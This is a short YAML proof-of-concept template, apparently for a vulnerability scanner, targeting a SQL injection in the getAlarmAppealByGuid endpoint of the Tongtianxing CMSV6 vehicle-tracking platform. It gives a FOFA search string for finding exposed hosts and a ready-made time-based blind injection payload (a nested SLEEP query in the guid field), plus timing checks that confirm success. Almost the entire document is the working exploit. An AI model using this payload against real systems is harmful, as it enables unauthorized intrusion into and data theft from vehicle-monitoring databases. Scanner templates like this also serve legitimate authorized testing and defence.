id: poc-yaml-g-sky-getalarmappealbyguid-sqli
info:
  name: 通天星CMS V6车载定位监控平台 getAlarmAppealByGuid SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: cmsv6
  fofa: body="/808gps/"
variables:
  t1: random_int(5,10)
  t2: t1 +2
requests:
- method: GET
  path: /808gps/login.html
  expression: status_code == 200 && contains(body,"/808gps/")
- method: POST
  path: /alarm_appeal/getAlarmAppealByGuid;downloadLogger.action
  headers:
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
  data: guid=1') AND (SELECT 3904 FROM (SELECT(SLEEP({{.t1}})))PITq) AND ('qhqF'='qhqF
  expression: "status_code == 200 && \ncontains(body,\"\\\"infos\\\":\\\"\\\"\") &&\n\
    contains(headers,\"filename=\") &&\ncontains(content_type,\"application/json\"\
    ) &&\nduration > t1 &&\nduration < t2\n"
transport: http
